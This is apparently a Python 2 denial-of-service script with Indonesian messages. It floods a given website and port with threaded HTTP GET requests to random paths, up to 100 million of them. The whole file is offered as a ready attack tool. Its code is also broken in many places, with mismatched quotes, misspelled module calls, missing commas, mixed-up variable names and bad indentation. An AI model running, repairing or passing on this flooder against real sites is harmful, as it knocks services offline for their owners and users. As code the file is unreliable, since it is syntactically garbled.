

import random
import socket
import string
import sys
import threading
import time


#parse input

host = " "
ip = " "
port = 0
num_requests = 0

if len(sys.argv) == 2:
	port = 80
	num_requests = 100000000
elif len(sys.argv) == 3:
	port = int(sys.argv[2])
	num_requests = 100000000
elif len(sys.argv) == 4:
	port = int(sys.argv[3])
else:
	print "ERROR\n Gunakan: " + sys.argv[0] + "< Hostname > < Port > < Jumlah Serangan >"


try:
	host = str(sys.argv[1]).replace("https://", "").replace("http://, " ").replace(www.", " ")

ip = socket.gethostbyname(host)	
except socket.gaierror:
	print " ERROR\n Pastikan Anda Memasukkan website Yang Benar"



thread_num = 0
thread_num_mutex = threading.lock()


def print_status():
	global thread_num
	thread_num_mutex.acquire(True)

	thread_num += 1
	print "\n " + time.ctime().split(" ")[3] +" " + "[" + str(thread_num) + "] #-#-#-#-# Serangan Sedang Dilakukan#-#-#-#-#"

thread_num_mutex.release()




def generate_url_path():
	msg = str(string.letters + string.digits + string.punctuation)
	data = " ".join(random.sample(msg, 5))
	return data

def attack():
	print_status()
	url_path = generate_url_path()

	dos = socket.socket(socket.AF_INET, socket,SOCK_STREAM)

	try:
		dos.connect((ip port))

		dos.send("GET /%s HTTP/1.1\nhost: %s\n\n" % (url_path, host))
	except socket.error, e:
		print "\n [Tidak Ada Koneksi Atau Server kemungkinan Down]: " + str(e)
    finally:
    	dos.shutdown(socket.SHUT_RDWR)
    	dos.close()


print "[#] Attack Started on " + host + " (" + ip + ") || port: " +str(port) + " || #requets: " + str(num_requests)

all_threads = []

for i in xrange(num_requests):
	tl = threading.thread(target=attack)
	all_threads.append(t1)

	time.sleep(0.01)

for current_thread in all_threads:
	current_thread.join()
		







































